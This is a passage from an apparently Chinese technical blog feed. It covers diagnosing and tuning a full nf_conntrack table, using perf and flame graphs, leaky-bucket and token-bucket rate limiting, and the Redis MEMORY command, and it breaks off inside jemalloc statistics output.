kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">02</span> dbl14192 kernel: nf_conntrack: <span class="hljs-keyword">table</span> full, dropping packet<br>Jul <span class="hljs-number">30</span> <span class="hljs-number">11</span>:<span class="hljs-number">50</span>:<span class="hljs-number">07</span> dbl14192 kernel: net_ratelimit: <span class="hljs-number">3626</span> callbacks suppressed<br></code></pre></td></tr></table></figure><h3 id="1-1、原因-复现"><a href="#1-1、原因-复现" class="headerlink" title="1.1、原因&#x2F;复现"></a>1.1、原因&#x2F;复现</h3><p>由于启用了<code>nf_conntrack模块</code>，业务短链接请求访问量大，由于conntrack采用默认的配置参数，短时间内导致conntrack的连接追踪表达到<code>65536*4=262144</code>默认的最大限制，新的连接无法建立，导致大量的丢包，业务因此无法正常访问；</p><ul><li><p>短连接为什么也会导致爆表？</p><ul><li>针对于各种协议的各种连接状态，连接追踪表中会保留对应的记录一段时间，具体时间可参考下文中的详细配置值，因此短链接又可能也会爆表；</li></ul><p><img src="/assets/images/conntrack.png" alt="nf_conntrack爆表分析" loading="lazy"></p></li></ul><p>后续尝试使用<code>redis-benchmark</code>进行<code>client为400000</code>的<code>短链接</code>压测却未能复现，原因是操作系统启用了端口复用（对应参数：<code>/proc/sys/net/ipv4/tcp_tw_reuse</code>），并且单机的socket连接数限制在65535，对于启用了<code>conntrack模块</code>的链接追踪表来说，测试的时候，记录的连接数不会超过65536，后续将<code>/proc/sys/net/netfilter/nf_conntrack_max</code>参数调小之后，稳定复现。</p><h3 id="1-2、修复"><a href="#1-2、修复" class="headerlink" title="1.2、修复"></a>1.2、修复</h3><p>如何避免再次出现这种问题，一下提供两种方式可供参考：</p><ul><li>禁用模块：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> iptables -t raw -A OUTPUT -j NOTRACK<br><span class="hljs-built_in">sudo</span> iptables -t raw -A PREROUTING -j NOTRACK<br></code></pre></td></tr></table></figure><ul><li>调整<code>nf_conntrack_max</code>：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">sysctl -w net.netfilter.nf_conntrack_max = 65536000<br></code></pre></td></tr></table></figure><h2 id="二、conntrack模块"><a href="#二、conntrack模块" class="headerlink" title="二、conntrack模块"></a>二、conntrack模块</h2><p>nf_conntrack模块在kernel 2.6.15（2006-01-03 发布） 被引入，支持IPv4 和IPv6，取代只支持IPv4 的ip_connktrack，用于跟踪一个连接的状态。连接状态跟踪可以供其他模块使用，最常见的两个使用场景是 iptables 的 nat 的 state 模块。</p><h3 id="2-1、模块管理"><a href="#2-1、模块管理" class="headerlink" title="2.1、模块管理"></a>2.1、模块管理</h3><p>nf_conntrack模块对应存在一个管理工具：<a href="https://git.netfilter.org/conntrack-tools">conntrack-tools</a>，该工具可手动安装，它是一款基于GNU &#x2F; Linux的免费软件工具，允许系统管理员从用户空间与内核中的<a href="http://people.netfilter.org/pablo/docs/login.pdf">连接跟踪系统进行</a>交互，该软件主要提供两个具体的工具：</p><ul><li><code>conntrack</code>：通过使用命令行指令提供比直接使用<code> /proc/net/ip_conntrack</code>更灵活的接口来管理连接跟踪系统。通过使用conntrack指令，您可以显示&#x2F;删除&#x2F;更新现有的状态条目，同时也可以监听流事件；</li><li><code>conntrackd</code>：用户空间连接跟踪守护程序，可用于部署容错GNU&#x2F;Linux防火墙，也可以使用它来收集防火墙中流的相关统计信息；</li></ul><h3 id="2-2、模块配置信息"><a href="#2-2、模块配置信息" class="headerlink" title="2.2、模块配置信息"></a>2.2、模块配置信息</h3><p>官方详细介绍地址：<a href="https://www.kernel.org/doc/Documentation/networking/nf_conntrack-sysctl.txt">https://www.kernel.org/doc/Documentation/networking/nf_conntrack-sysctl.txt</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 启用连接跟踪流记帐。每个流添加64位字节和数据包计数器。(BOOLEAN：默认为零)</span><br>nf_conntrack_acct<br><span class="hljs-comment"># 哈希表的大小，如果在模块加载期间未指定该参数，则通过将总内存除以16384来计算默认大小以确定存储区的数量，但是哈希表将永远不会少于32并且限制为16384个存储区。 对于内存超过4GB的系统，它将是65536个桶。 此sysctl只能在初始网络命名空间中写入。（INTEGER）</span><br>nf_conntrack_buckets<br><span class="hljs-comment"># 验证传入数据包的校验和。校验和错误的数据包处于INVALID状态。如果启用此选项，则不会考虑此类数据包进行连接跟踪。(BOOLEAN：默认为非零)</span><br>nf_conntrack_checksum<br><span class="hljs-comment"># 当前分配的流条目数（INTEGER）</span><br>nf_conntrack_count<br><span class="hljs-comment"># 如果启用此选项，连接跟踪代码将通过ctnetlink为用户空间提供连接跟踪事件。（BOOLEAN：默认为非零）</span><br>nf_conntrack_events<br><span class="hljs-comment"># 期望表的最大大小。 默认值为nf_conntrack_buckets/256，最小值为1。（INTEGER）</span><br>nf_conntrack_expect_max<br><span class="hljs-comment"># 用于重组IPv6片段的最大内存。 当为此目的分配nf_conntrack_frag6_high_thresh字节的内存时，片段处理程序将抛出数据包，直到达到nf_conntrack_frag6_low_thresh。（INTEGER：默认是262144）</span><br>nf_conntrack_frag6_high_thresh<br><span class="hljs-comment"># 参见nf_conntrack_frag6_low_thresh（INTEGER：默认是196608）</span><br>nf_conntrack_frag6_low_thresh<br><span class="hljs-comment"># 将IPv6片段保留在内存中的时间（INTEGER：单位秒）</span><br>nf_conntrack_frag6_timeout<br><span class="hljs-comment"># 通用超时的默认值。 这指的是第4层未知/不支持的协议。（INTEGER：默认为600，单位秒）</span><br>nf_conntrack_generic_timeout<br><span class="hljs-comment"># 启用自动conntrack帮助程序分配。如果禁用，则需要设置iptables规则以将帮助程序分配给连接。 有关详细信息，请参阅iptables-extensions（8）手册页中的CT目标描述。</span><br>nf_conntrack_helper<br><span class="hljs-comment"># ICMP超时时间（INTEGER：默认为30秒）</span><br>nf_conntrack_icmp_timeout<br><span class="hljs-comment"># ICMP6超时时间（INTEGER：默认为30秒）</span><br>nf_conntrack_icmpv6_timeout<br><span class="hljs-comment"># 记录value指定类型的无效数据包（INTEGER）</span><br>nf_conntrack_log_invalid<br><span class="hljs-comment"># 连接跟踪表的大小（INTEGER：默认为nf_conntrack_buckets * 4）</span><br>nf_conntrack_max<br><span class="hljs-comment"># 在你所做的事情上保守一点，在你接受别人的事情上保持自由。如果它不是零，我们只将窗口RST段标记为无效（BOOLEAN：默认为零）</span><br>nf_conntrack_tcp_be_liberal<br><span class="hljs-comment"># 如果设置为零，我们将禁用拾取已建立的连接（BOOLEAN：默认为非零）</span><br>nf_conntrack_tcp_loose<br><span class="hljs-comment"># 在未收到来自目标的（可接受）ACK的情况下可以重新传输的最大数据包数。 如果达到此数量，将启动更短的计时器（INTEGER：默认为3）</span><br>nf_conntrack_tcp_max_retrans<br><span class="hljs-comment"># TCP连接状态为close的记录超时时间（INTEGER：默认为10秒）</span><br>nf_conntrack_tcp_timeout_close<br><span class="hljs-comment"># TCP连接状态为close_wait的记录超时时间（INTEGER：默认为60秒）</span><br>nf_conntrack_tcp_timeout_close_wait<br><span class="hljs-comment"># TCP连接状态为established的记录超时时间（INTEGER：默认为432000秒）</span><br>nf_conntrack_tcp_timeout_established<br><span class="hljs-comment"># TCP连接状态为fin_wait的记录超时时间（INTEGER：默认为120秒）</span><br>nf_conntrack_tcp_timeout_fin_wait<br><span class="hljs-comment"># TCP连接状态为last_ack的记录超时时间（INTEGER：默认为30秒）</span><br>nf_conntrack_tcp_timeout_last_ack<br><span class="hljs-comment"># （INTEGER：默认为300秒）</span><br>nf_conntrack_tcp_timeout_max_retrans<br><span class="hljs-comment"># TCP连接状态为syn_recv的记录超时时间（INTEGER：默认为60秒）</span><br>nf_conntrack_tcp_timeout_syn_recv<br><span class="hljs-comment"># TCP连接状态为syn_sent的记录超时时间（INTEGER：默认为120秒）</span><br>nf_conntrack_tcp_timeout_syn_sent<br><span class="hljs-comment"># TCP连接状态为syn_sent的记录超时时间（INTEGER：默认为120秒）</span><br>nf_conntrack_tcp_timeout_time_wait<br><span class="hljs-comment"># （INTEGER：默认为300秒）</span><br>nf_conntrack_tcp_timeout_unacknowledged<br><span class="hljs-comment"># （BOOLEAN：默认为零）</span><br>nf_conntrack_timestamp<br><span class="hljs-comment"># （INTEGER：默认为30秒）</span><br>nf_conntrack_udp_timeout<br><span class="hljs-comment"># （INTEGER：默认为120秒）</span><br>nf_conntrack_udp_timeout_stream<br><span class="hljs-comment"># （INTEGER：默认为30秒）</span><br>nf_conntrack_gre_timeout<br><span class="hljs-comment"># 如果检测到GRE流，将使用此扩展超时（INTEGER：默认为180秒）</span><br>nf_conntrack_gre_timeout_stream<br></code></pre></td></tr></table></figure><h2 id="三、相关指令"><a href="#三、相关指令" class="headerlink" title="三、相关指令"></a>三、相关指令</h2><ul><li><p>conntrack内核参数列表：<code>sudo sysctl -a | grep conntrack</code>；</p></li><li><p>conntrack超时相关参数：<code>sudo sysctl -a | grep conntrack | grep timeout</code>；</p></li><li><p>conntrack跟踪表的大小（桶的数量）：<code>sudo sysctl net.netfilter.nf_conntrack_buckets</code>；</p></li><li><p>conntrack最大跟踪连接数：<code>sudo sysctl net.netfilter.nf_conntrack_max</code>；</p></li><li><p>netfilter模块加载时的默认值：<code>sudo dmesg | grep conntrack</code>；</p></li><li><p>conntrack跟踪表使用情况：<code>sudo sysctl net.netfilter.nf_conntrack_count</code>；</p></li><li><p>四层协议类型和连接数：<code>sudo cat /proc/net/nf_conntrack | awk &#39;{sum[$3]++} END {for(i in sum) print i, sum[i]}&#39;</code>；</p></li><li><p>TCP 连接各状态对应的条数：<code>sudo cat /proc/net/nf_conntrack | awk &#39;/^.*tcp.*$/ {sum[$6]++} END {for(i in sum) print i, sum[i]}&#39;</code>；</p></li><li><p>三层协议类型和连接数：<code>sudo cat /proc/net/nf_conntrack | awk &#39;{sum[$1]++} END {for(i in sum) print i, sum[i]}&#39;</code>；</p></li><li><p>连接数最多的10个IP地址：<code>sudo cat /proc/net/nf_conntrack | awk &#39;{print $7}&#39; | cut -d &quot;=&quot; -f 2 | sort | uniq -c | sort -nr | head -n 10</code>；</p></li></ul><h2 id="四、相关链接"><a href="#四、相关链接" class="headerlink" title="四、相关链接"></a>四、相关链接</h2><ul><li><p><a href="https://git.netfilter.org/conntrack-tools">https://git.netfilter.org/conntrack-tools</a></p></li><li><p><a href="http://conntrack-tools.netfilter.org/manual.html">http://conntrack-tools.netfilter.org/manual.html</a></p></li><li><p><a href="https://www.slideserve.com/liseli/linux-kernel-2-4-conntrack">https://www.slideserve.com/liseli/linux-kernel-2-4-conntrack</a></p></li><li><p><a href="http://keithmo.me/post/2018/08/25/conntrack-tuning/">http://keithmo.me/post/2018/08/25/conntrack-tuning/</a></p></li><li><p><a href="https://testerhome.com/topics/15824">https://testerhome.com/topics/15824</a></p></li><li><p><a href="https://clodfisher.github.io/2018/09/nf_conntrack/">https://clodfisher.github.io/2018/09/nf_conntrack/</a></p></li><li><p><a href="https://blog.csdn.net/yaopeng_2005/article/details/7064869">https://blog.csdn.net/yaopeng_2005/article/details/7064869</a></p></li><li><p><a href="https://xmoyking.github.io/2017/06/20/iptables/">https://xmoyking.github.io/2017/06/20/iptables/</a></p></li><li><p><a href="https://my.oschina.net/u/232595/blog/1919450">https://my.oschina.net/u/232595/blog/1919450</a></p></li><li><p><a href="https://blog.csdn.net/iteye_21199/article/details/82278402">https://blog.csdn.net/iteye_21199/article/details/82278402</a></p></li><li><p><a href="https://blog.csdn.net/dhRainer/article/details/83411428">https://blog.csdn.net/dhRainer/article/details/83411428</a></p></li><li><p><a href="https://blog.csdn.net/jasonchen_gbd/article/details/44874321">https://blog.csdn.net/jasonchen_gbd/article/details/44874321</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> nf_conntrack </tag>
            
            <tag> Iptables </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Perf与火焰图</title>
      <link href="/2019/07/10/perf/"/>
      <url>/2019/07/10/perf/</url>
      
        <content type="html"><![CDATA[<h2 id="一、Perf"><a href="#一、Perf" class="headerlink" title="一、Perf"></a>一、Perf</h2><p>Perf 是基于Linux 2.6+系统的一款性能分析工具。它可以用来分析应用程序和内核的性能问题，从而全面理解应用程序中的性能瓶颈。</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@bugwz ~]# perf --<span class="hljs-built_in">help</span><br><br> usage: perf [--version] [--<span class="hljs-built_in">help</span>] [OPTIONS] COMMAND [ARGS]<br><br> The most commonly used perf commands are:<br>   annotate        Read perf.data (created by perf record) and display annotated code<br>   archive         Create archive with object files with build-ids found <span class="hljs-keyword">in</span> perf.data file<br>   bench           General framework <span class="hljs-keyword">for</span> benchmark suites<br>   buildid-cache   Manage build-id cache.<br>   buildid-list    List the buildids <span class="hljs-keyword">in</span> a perf.data file<br>   data            Data file related processing<br>   diff            Read perf.data files and display the differential profile<br>   evlist          List the event names <span class="hljs-keyword">in</span> a perf.data file<br>   inject          Filter to augment the events stream with additional information<br>   kmem            Tool to trace/measure kernel memory properties<br>   kvm             Tool to trace/measure kvm guest os<br>   list            List all symbolic event types<br>   lock            Analyze lock events<br>   mem             Profile memory accesses<br>   record          Run a <span class="hljs-built_in">command</span> and record its profile into perf.data<br>   report          Read perf.data (created by perf record) and display the profile<br>   <span class="hljs-built_in">sched</span>           Tool to trace/measure scheduler properties (latencies)<br>   script          Read perf.data (created by perf record) and display trace output<br>   <span class="hljs-built_in">stat</span>            Run a <span class="hljs-built_in">command</span> and gather performance counter statistics<br>   <span class="hljs-built_in">test</span>            Runs sanity tests.<br>   timechart       Tool to visualize total system behavior during a workload<br>   top             System profiling tool.<br>   probe           Define new dynamic tracepoints<br>   trace           strace inspired tool<br><br> See <span class="hljs-string">&#x27;perf help COMMAND&#x27;</span> <span class="hljs-keyword">for</span> more information on a specific <span class="hljs-built_in">command</span>.<br></code></pre></td></tr></table></figure><ul><li><code>annotate</code>：读取perf record生成的数据文件，如果目标文件具有调试符号，则源代码将与汇编代码一起显示，如果对象中没有调试信息，则会显示带注释的程序集；</li><li><code>archive</code>：根据perf record生成的数据文件记录的build-id，将所有被采样到的elf文件打包，利用此压缩包，可以在任何机器上分析数据文件中记录的采样数据；</li><li><code>bench</code>：perf中内置的benchmark，可对对系统性能进行摸底；</li><li><code>buildid-cache</code>：用来管理perf文件的buildid缓存，每个elf文件都有独一无二的buildid，buildid被perf用来将elf文件和它的性能数据关联起来；</li><li><code>build-list</code>：列出数据文件中记录的所有buildid；</li><li><code>data</code>：数据文件的相关处理；</li><li><code>diff</code>：对比两个数据文件的差异。能够给出每个符号（函数）在热点分析上的具体差异；</li><li><code>evlist</code>：列出数据文件perf.data中所有性能事件；</li><li><code>inject</code>：过滤perf record的数据流，并将其定向到标准输出，在被分析代码中的任何一点，都可以向事件流中注入其它事件；</li><li><code>kmem</code>：针对内核内存（slab）子系统进行追踪测量的工具；</li><li><code>kvm</code>：用来追踪测试运行在KVM虚拟机上的Guest OS；</li><li><code>list</code>：查看当前系统支持的所有性能事件，包括硬件性能事件、软件性能事件以及检查点；</li><li><code>lock</code>：分析内核中的锁信息，包括锁的争用情况，等待延迟等；</li><li><code>mem</code>：分析内存存取情况；</li><li><code>record</code>：收集采样信息，并将其记录在数据文件中，随后可通过其它工具对数据文件进行分析；</li><li><code>report</code>：读取perf record创建的数据文件，并给出热点分析结果；</li><li><code>sched</code>：针对调度器子系统的分析工具；</li><li><code>script</code>：执行perl或python写的功能扩展脚本、生成脚本框架、读取数据文件中的数据信息等；</li><li><code>stat</code>：执行某个命令，收集特定进程的性能概况，包括CPI、Cache丢失率等；</li><li><code>test</code>：对当前软硬件平台进行健全性测试，可用此工具测试当前的软硬件平台是否能支持perf的所有功能；</li><li><code>timechart</code>：针对测试期间系统行为进行可视化的工具；</li><li><code>top</code>：可实时查看当前系统进程函数占用率情况；</li><li><code>probe</code>：关于syscall的工具；</li><li><code>trace</code>：用于定义动态检查点；</li></ul><h3 id="1-1、使用示例"><a href="#1-1、使用示例" class="headerlink" title="1.1、使用示例"></a>1.1、使用示例</h3><p>按照<code>每秒99次</code>的采样频率对<code>进程号为13294</code>的进程进行<code>持续30秒</code>的性能分析，并将结果记录在当前目录的<code>perf.data</code>文件中：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perf record -F 99 -g -p 13204 --<span class="hljs-built_in">sleep</span> 30<br></code></pre></td></tr></table></figure><ul><li><code>perf record</code>：表示记录；</li><li><code>-F 99</code>：每秒99次采集；</li><li><code>-g</code> ：采集符号；</li><li><code>-p 13204</code>：进程号，即对哪个进程进行分析；</li><li><code>sleep 30</code>：持续30秒；</li></ul><p>监测<code>进程号为10034</code>的进程的函数占用率情况：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> perf top -p 10034<br></code></pre></td></tr></table></figure><h2 id="二、火焰图"><a href="#二、火焰图" class="headerlink" title="二、火焰图"></a>二、火焰图</h2><p><a href="https://github.com/brendangregg/FlameGraph">火焰图</a> 是依据 perf 的分析结果而产生的一个 SVG 图片，它是一种可视化堆栈跟踪样本的方法。</p><ul><li><code>x 轴</code>：表示抽样的样本总体，每个函数都被绘制成矩形，其宽度相当于样本数，宽度越大表示该函数被抽到的次数越多，即执行的时间越长；</li><li><code>y 轴</code>：表示堆栈深度，顶部是正在执行的函数，下方是它的父函数，火焰越高表示调用栈越深；</li></ul><h3 id="2-1、将perf数据转换为火焰图"><a href="#2-1、将perf数据转换为火焰图" class="headerlink" title="2.1、将perf数据转换为火焰图"></a>2.1、将perf数据转换为火焰图</h3><ul><li><p>下载火焰图项目，需要用到项目的相关脚本：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/brendangregg/FlameGraph.git<br></code></pre></td></tr></table></figure></li><li><p>用 <code>perf script</code> 工具对perf.data进行解析：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">perf script -i perf.data &gt; perf.unfold<br></code></pre></td></tr></table></figure></li><li><p>将 <code>perf.unfold</code> 中的符号进行折叠：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./FlameGraph/stackcollapse-perf.pl perf.unfold &gt; perf.folded<br></code></pre></td></tr></table></figure></li><li><p>生成svg火焰图：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">./FlameGraph/flamegraph.pl perf.folded &gt; perf.svg<br></code></pre></td></tr></table></figure></li></ul><h2 id="三、参考链接"><a href="#三、参考链接" class="headerlink" title="三、参考链接"></a>三、参考链接</h2><ul><li><a href="https://blog.csdn.net/qinglongzhan/article/details/89350195">https://blog.csdn.net/qinglongzhan/article/details/89350195</a></li><li><a href="http://www.ruanyifeng.com/blog/2017/09/flame-graph.html">http://www.ruanyifeng.com/blog/2017/09/flame-graph.html</a></li><li><a href="https://segmentfault.com/a/1190000021465563">https://segmentfault.com/a/1190000021465563</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Perf </tag>
            
            <tag> 火焰图 </tag>
            
            <tag> 性能分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏桶与令牌桶速率限制算法</title>
      <link href="/2019/07/01/leaky-and-token-bucket/"/>
      <url>/2019/07/01/leaky-and-token-bucket/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏桶算法"><a href="#一、漏桶算法" class="headerlink" title="一、漏桶算法"></a>一、漏桶算法</h2><p>漏桶算法(<code>Leaky Bucket</code>)是网络世界中流量整形（<code>Traffic Shaping</code>）或速率限制（<code>Rate Limiting</code>）时经常使用的一种算法，它的主要目的是控制数据注入到网络的速率，平滑网络上的突发流量。漏桶算法提供了一种机制，通过它，突发流量可以被整形以便为网络提供一个稳定的流量。示意图如下所示：</p><p><img src="/assets/images/Leaky-Bucket.png" alt="Leaky Bucket" loading="lazy"></p><h3 id="1-1、算法过程"><a href="#1-1、算法过程" class="headerlink" title="1.1、算法过程"></a>1.1、算法过程</h3><ul><li><code>数据包入队列</code>：数据包按照一定的顺序存储入用于临时存储的缓存队列（数据桶）中；</li><li><code>数据包等待或溢出</code>：数据包在缓存队列（数据桶）中等待一段时间，或者如果此时缓存队列（数据桶）已经达到存储的上限，数据包溢出（被丢弃）；</li><li><code>数据包出队列</code>：将缓存队列（数据桶）中的数据包按照固定的速率依次出队列并进行处理；</li></ul><h3 id="1-2、特点"><a href="#1-2、特点" class="headerlink" title="1.2、特点"></a>1.2、特点</h3><ul><li>优点：<ul><li>能够强行限制数据的传输速率；</li><li>保证严格的延迟界限；</li></ul></li><li>缺点：<ul><li>对突发性的流量缺乏处理效率；</li></ul></li></ul><h3 id="1-3、相关项目"><a href="#1-3、相关项目" class="headerlink" title="1.3、相关项目"></a>1.3、相关项目</h3><ul><li>Nginx中关于漏桶的设计与实现：<code>ngx_http_limit_req_module</code> 模块中的<code>ngx_http_limit_req_lookup</code>函数（位于<code>./src/http/modules/ngx_http_limit_req_module.c</code>）；</li></ul><h2 id="二、令牌桶算法"><a href="#二、令牌桶算法" class="headerlink" title="二、令牌桶算法"></a>二、令牌桶算法</h2><p>令牌桶算法（<code>Token Bucket</code>）是网络流量整形（<code>Traffic Shaping</code>）和速率限制（<code>Rate Limiting</code>）中最常使用的一种算法。典型情况下，令牌桶算法用来控制发送到网络上的数据的数目，并允许突发数据的发送。示意图如下所示：</p><p><img src="/assets/images/Token-Bucket.png" alt="Token Bucket" loading="lazy"></p><h3 id="2-1、算法过程"><a href="#2-1、算法过程" class="headerlink" title="2.1、算法过程"></a>2.1、算法过程</h3><ul><li><p><code>产生令牌</code>：周期性的以速率CIR&#x2F;EIR向令牌桶中增加令牌，桶中的令牌不断增多，如果桶中令牌数已到达CBS&#x2F;EBS，则丢弃多余令牌；</p></li><li><p><code>消耗令牌</code>：输入数据包会消耗桶中的令牌，在网络传输中，数据包的大小通常不一致，大的数据包相较于小的数据包消耗的令牌要多；</p></li><li><p><code>判断是否通过</code>：输入数据包经过令牌桶后的结果包括输出的数据包和丢弃的数据包，当桶中的令牌数量可以满足数据包对令牌的需求，则将数据包输出，否则将其丢弃；</p></li></ul><h3 id="2-2、特点"><a href="#2-2、特点" class="headerlink" title="2.2、特点"></a>2.2、特点</h3><ul><li><p>优点：</p><ul><li>允许一定程度突发流量传输；</li></ul></li><li><p>缺点：</p><ul><li>可能会存在一些误判；</li></ul></li></ul><h3 id="2-3、相关项目"><a href="#2-3、相关项目" class="headerlink" title="2.3、相关项目"></a>2.3、相关项目</h3><ul><li><a href="https://github.com/google/guava">Guava</a>中的<a href="https://guava.dev/releases/19.0/api/docs/index.html?com/google/common/util/concurrent/RateLimiter.html">RateLimiter</a>；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 限流 </tag>
            
            <tag> Nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis的Memory命令讲解</title>
      <link href="/2019/01/24/memory-redis/"/>
      <url>/2019/01/24/memory-redis/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p><code>Memory</code>指令是Redis4.0版本更新的特性，可用于详细的分析内存的使用情况，内存使用诊断，内存碎片回收等工作；</p><p>可以通过<code>memory help</code>指令打印出<code>memory</code>指令的信息，详细信息如下所示：</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">1) MEMORY &lt;subcommand&gt; arg arg ... arg. Subcommands are:<br>2) DOCTOR - Return memory problems reports.<br>3) MALLOC-STATS -- Return internal statistics report from the memory allocator.<br>4) PURGE -- Attempt to purge dirty pages <span class="hljs-keyword">for</span> reclamation by the allocator.<br>5) STATS -- Return information about the memory usage of the server.<br>6) USAGE &lt;key&gt; [SAMPLES &lt;count&gt;] -- Return memory <span class="hljs-keyword">in</span> bytes used by &lt;key&gt; and its value. Nested values are sampled up to &lt;count&gt; <span class="hljs-built_in">times</span> (default: 5).<br></code></pre></td></tr></table></figure><p>具体的指令相关解释为：</p><ul><li><code>MEMORY DOCKER</code>：返回内存问题报告；</li><li><code>MEMORY MALLOC-STATS</code>：从内存分配器返回内部统计信息报告；</li><li><code>MEMORY PURGE</code>：尝试通过分配器清除脏页以进行回收；</li><li><code>MEMORY STATS</code>：返回有关服务器内存使用情况的信息；</li><li><code>MEMORY USAGE key [SAMPLES count]</code>：返回 key 使用的字节数及其值， 嵌套值最多采样 count 次（默认值：5）；</li></ul><h2 id="二、具体的指令解析"><a href="#二、具体的指令解析" class="headerlink" title="二、具体的指令解析"></a>二、具体的指令解析</h2><h3 id="2-1、MEMORY-DOCKER"><a href="#2-1、MEMORY-DOCKER" class="headerlink" title="2.1、MEMORY DOCKER"></a>2.1、MEMORY DOCKER</h3><p><strong>使用方式：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">memory doctor<br></code></pre></td></tr></table></figure><p>该指令主要列举条件判断，满足条件的给出检查结果和建议，主要包含以下几点，满足其中一点，就给出诊断结果和建议，检测报告会提示所有检测出的问题，检测结构主要为一下几种情况：</p><ul><li><code>无异常</code>：并没有检测出问题；</li><li><code>空实例/内存占用小</code>：示例实际分配内存小于5M，无法进一步进行检测（代码：<code>mh-&gt;total_allocated &lt; (1024*1024*5)</code>）；</li><li><code>历史内存与当前内存比例过大</code>：redis自启动以来分配的内存峰值&#x2F;当前的内存大小结果大于 1.5（代码：<code>((float)mh-&gt;peak_allocated / mh-&gt;total_allocated) &gt; 1.5</code>）；</li><li><code>内存碎片率</code>：内存碎片率大于1.4（代码：<code>mh-&gt;fragmentation &gt; 1.4</code>）；</li><li><code>一般客户端单实例内存</code>：非从库客户端的单实例内存占用大于200KB（代码：<code>mh-&gt;clients_normal / numclients &gt; (1024*200)</code>）；</li><li><code>从库客户端单实例内存</code>：在有从库的前提下，从库客户端的单实例内存占用大于10M（代码：<code>numslaves &gt; 0 &amp;&amp; mh-&gt;clients_slaves / numslaves &gt; (1024*1024*10)</code>）；</li></ul><p><strong>执行结果示例：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">Sam, I detected a few issues <span class="hljs-keyword">in</span> this Redis instance memory implants:<br><br> * High fragmentation: This instance has a memory fragmentation greater than 1.4 (this means that the Resident Set Size of the Redis process is much larger than the <span class="hljs-built_in">sum</span> of the logical allocations Redis performed). This problem is usually due either to a large peak memory (check <span class="hljs-keyword">if</span> there is a peak memory entry above <span class="hljs-keyword">in</span> the report) or may result from a workload that causes the allocator to fragment memory a lot. If the problem is a large peak memory, <span class="hljs-keyword">then</span> there is no issue. Otherwise, make sure you are using the Jemalloc allocator and not the default libc malloc. Note: The currently used allocator is <span class="hljs-string">&quot;jemalloc-3.2.0&quot;</span>.<br><br>I<span class="hljs-string">&#x27;m here to keep you safe, Sam. I want to help you.</span><br></code></pre></td></tr></table></figure><h3 id="2-2、MEMORY-MALLOC-STATS"><a href="#2-2、MEMORY-MALLOC-STATS" class="headerlink" title="2.2、MEMORY MALLOC-STATS"></a>2.2、MEMORY MALLOC-STATS</h3><p><strong>使用方式：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">memory malloc-stats<br></code></pre></td></tr></table></figure><p>打印内存分配器状态，只在使用jemalloc时有用；</p><p><strong>执行结果示例：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">___ Begin jemalloc statistics ___<br>Version: 3.2.0-0-g87499f6748ebe4817571e817e9f680ccb5bf54a9<br>Assertions disabled<br>Run-<span class="hljs-keyword">time</span> option settings:<br>  opt.abort: <span class="hljs-literal">false</span><br>  opt.lg_chunk: 22<br>  opt.dss: <span class="hljs-string">&quot;secondary&quot;</span><br>  opt.narenas: 128<br>  opt.lg_dirty_mult: 3<br>  opt.stats_print: <span class="hljs-literal">false</span><br>  opt.junk: <span class="hljs-literal">false</span><br>  opt.quarantine: 0<br>  opt.redzone: <span class="hljs-literal">false</span><br>  opt.zero: <span class="hljs-literal">false</span><br>  opt.tcache: <span class="hljs-literal">true</span><br>  opt.lg_tcache_max: 15<br>CPUs: 32<br>Arenas: 128<br>Pointer size: 8<br>Quantum size: 16<br>Page size: 